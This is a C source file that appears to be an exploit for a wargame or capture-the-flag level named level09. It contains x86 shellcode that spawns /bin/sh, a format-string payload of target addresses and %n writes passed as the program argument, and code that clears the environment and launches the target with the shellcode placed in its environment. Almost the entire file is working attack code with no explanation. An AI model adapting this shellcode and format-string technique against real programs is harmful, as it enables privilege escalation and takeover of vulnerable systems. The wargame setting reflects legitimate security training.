#include <stdio.h>
#include <string.h>
#include <unistd.h>

char sc[] = "\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
char argv1[] = "\xd4\x94\x04\x08\xd5\x94\x04\x08\xd6\x94\x04\x08\xd7\x94\x04\x08%189u%4$n%18u%5$n%32u%6$n%192u%7$n";

extern char **environ;

int main(int argc, char **argv)
{
        char *env[2] = {sc, NULL};
        int i;

        printf("Removing environment variables\n");

        for(i = 0; environ[i] != NULL; i++) {
             memset(environ[i], 0x00, strlen(environ[i]));
        }

        execle("/levels/level09", "level09", argv1, NULL, env);
        return 0;
}

